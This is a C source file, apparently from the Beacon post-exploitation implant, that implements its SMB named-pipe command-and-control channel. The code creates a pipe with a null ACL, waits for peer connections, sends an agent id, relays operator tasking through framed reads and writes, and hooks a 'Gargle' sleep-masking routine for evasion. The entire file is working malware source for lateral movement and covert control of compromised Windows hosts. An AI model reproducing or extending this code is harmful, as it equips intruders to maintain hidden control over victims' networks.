/*
 * Manage the SMB data channel for Beacon
 * Entry point:
 *	1. command_link_wait
 *		user requested SMB data channel
 *	2. smb_init 
 *		create our named pipe with a null ACL
 *	3. smb_wait
 *		wait for a connection... send agent id when it comes
 *	4. smb_process
 *		process server data please... do normal beacon stuff.
 */

#include "beacon.h"
#include "channel.h"
#include "commands.h"
#include "security.h"
#include "link.h"
#include "linkint.h"
#include "clientint.h"
#include "jobs.h"

extern unsigned int post_type;
extern unsigned int sleep_time;
static HANDLE       pipe;

BOOL GarglePipeWait(HANDLE pipe);
void GargleBlockPipe(HANDLE pipe);

int link_channel_smb_extc2_read(void * thisp, char * buffer, int max) {
	LCHANNEL * inst = (LCHANNEL *)thisp;
	int        get = 0, rlen = 0;

	/* read our length into a pro-forma frame */
	rlen = read_all(inst->pipe, (char *)&get, 4);
	if (rlen == -1 || rlen != 4)
		return -1;

	/* sanity check our get value */
	if (get > max)
		return -1;

	return read_all(inst->pipe, buffer, get);
}

int link_channel_smb_extc2_write(void * thisp, char * buffer, int length) {
	LCHANNEL * inst = (LCHANNEL *)thisp;
	char     * frame;
	int        flen;

	/* restore old behavior of writing a single byte as our heartbeat, instead of pushing empty frames */
	if (length == 0) {
		int empty = 0;
		return link_channel_smb_extc2_write(thisp, (char *)&empty, 1);
	}

	/* build and write our frame header */
	if (!write_all(inst->pipe, (char *)&length, 4))
		return FALSE;

	/* write the entire package */
	return write_all(inst->pipe, buffer, length);
}

/* call our gargle function */
static void link_channel_smb_wait(void * thisp) {
	LCHANNEL * inst = (LCHANNEL *)thisp;
	GargleBlockPipe(inst->pipe);
}

/* create a new kind of channel */
LCHANNEL lchannel_smb_gargle(HANDLE pipe) {
	LCHANNEL channel;
	channel = lchannel_smb(pipe);
	channel.wait  = link_channel_smb_wait;
	channel.read  = link_channel_smb_extc2_read;
	channel.write = link_channel_smb_extc2_write;
	return channel;
}

/*
* wait for a connection to our named pipe
*/
void smb_wait() {
	if (GarglePipeWait(pipe)) {
		/* we have a connection, yay */
	}
	else {											/* plan B */
		DWORD fConnected = 0;

		/* wait for a connection to our pipe */
		while (!fConnected) {
			fConnected = ConnectNamedPipe(pipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
		}
	}

	/* OK, kick off our client init routine. */
	client_init(lchannel_smb_gargle(pipe));
}

/*
*  init a named pipe
*/
BOOL smb_init() {
	HANDLE temps = INVALID_HANDLE_VALUE;

	/* setup our named pipe please */
	temps = CreateNamedPipe(setting_ptr(SETTING_PIPENAME), PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE, PIPE_UNLIMITED_INSTANCES, MAX_GET, MAX_GET, 0, NULL);

	/* check for errors and fail now... */
	if (temps == INVALID_HANDLE_VALUE) {
		post_error_d(0x17, GetLastError());
		return FALSE;
	}

	/* set post type to POST_SMB now... since everything seems OK */
	post_type = POST_SMB;

	/* now we can assign the handle */
	pipe = temps;
	return TRUE;
}

/* stop everything */
void smb_stop() {
	/* OK, shut everything down! */
	CloseHandle(pipe);

	/* clean up the resources with our last go */
	client_stop();
}

/*
* put this beacon into a mode where it's waiting for a connection to its pipe
*/
void command_link_wait() {
	/* setup our SMB server */
	if (!smb_init()) {
		return;
	}

	/* while we are an SMB server... do this stuff */
	while (sleep_time > 0) {
		/* wait for a connection and send our agent id */
		smb_wait();

		/* process data */
		client_process();

		/* close the session */
		FlushFileBuffers(pipe);
		DisconnectNamedPipe(pipe);
	}

	/* we're no longer an SMB server... stop the shenanigans */
	smb_stop();

	/* just kill the process... it's this or crash */
	safe_exit();
}